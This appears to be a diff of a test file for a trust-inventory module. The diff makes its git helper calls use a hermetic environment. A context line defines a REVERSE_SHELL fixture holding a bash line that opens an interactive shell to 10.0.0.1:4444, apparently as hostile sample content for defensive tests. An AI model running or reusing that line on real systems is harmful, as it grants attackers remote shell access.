@@ -15,6 +15,7 @@ import {
   type TrustFileEntry,
   type TrustFileInventory,
 } from "../../src/trust/inventory.js";
+import { hermeticGitEnv } from "../git-fixture-env.js";
 
 const REVERSE_SHELL = "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
 
@@ -22,7 +23,7 @@ let repoDir: string;
 let cacheHome: string;
 
 function git(dir: string, args: string[]): void {
-  execFileSync("git", args, { cwd: dir, stdio: "pipe" });
+  execFileSync("git", args, { cwd: dir, stdio: "pipe", env: hermeticGitEnv() });
 }
 
 function initGitRepo(files: Record<string, string>): void {
